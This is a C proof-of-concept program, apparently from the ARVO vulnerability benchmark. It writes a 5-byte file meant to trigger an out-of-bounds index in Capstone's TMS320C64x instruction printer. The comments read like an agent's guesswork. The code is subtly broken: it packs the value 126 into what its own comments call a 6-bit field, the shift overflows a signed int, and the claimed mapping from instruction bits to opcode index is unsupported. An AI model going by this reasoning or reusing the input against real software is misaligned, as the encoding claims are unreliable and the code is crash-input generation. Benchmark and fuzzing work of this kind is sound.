#include <stdio.h>
#include <stdlib.h>

/* PoC for arvo:12957 */
/* Triggers: index 126 out of bounds for type 'const uint16_t [89]' in TMS320C64xGenAsmWriter.inc */
/* Vuln class: index_out_of_bounds */

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) {
        perror("fopen");
        return 1;
    }

    unsigned char buf[5];
    
    /* Byte 0: platform index for TMS320C64x (index 27 in platforms array) */
    buf[0] = 0x1B;
    
    /* 
     * Based on the senior engineer's analysis, the vulnerability is in
     * OpInfo[MCInst_getOpcode(MI)] where OpInfo[] has 89 entries.
     * The decoded opcode must be >= 89 to trigger the OOB.
     * 
     * Looking at the TMS320C64x instruction encoding, the opcode is
     * extracted from specific bit positions in the 32-bit instruction.
     * The DecoderTable32 maps instruction bit patterns to opcodes.
     * 
     * A valid instruction that produces a large opcode value would
     * have specific bit patterns in the instruction word.
     * 
     * Let me try a different approach: use the instruction encoding
     * from the Capstone source. The TMS320C64x instructions use
     * a 32-bit word where bits 31-26 contain the opcode field.
     * If we set bits 31-26 to a value that decodes to opcode 126,
     * we can trigger the OOB.
     * 
     * The instruction format for TMS320C64x:
     * Bits 31-26: opcode (6 bits)
     * Bits 25-20: dst register (6 bits)
     * Bits 19-14: src1 register (6 bits)
     * Bits 13-8:  src2 register (6 bits)
     * Bits 7-0:   constant (8 bits)
     * 
     * Let me try opcode = 126 (0x7E) in bits 31-26.
     * This would give an opcode value of 126 which exceeds 89.
     */
    
    /* Encode instruction with opcode = 126 */
    unsigned int instr = (126 << 26) | (0 << 20) | (0 << 14) | (0 << 8) | 0;
    
    /* Write bytes in big-endian order */
    buf[1] = (instr >> 24) & 0xFF;
    buf[2] = (instr >> 16) & 0xFF;
    buf[3] = (instr >> 8) & 0xFF;
    buf[4] = instr & 0xFF;
    
    fwrite(buf, 1, 5, f);
    fclose(f);
    
    return 0;
}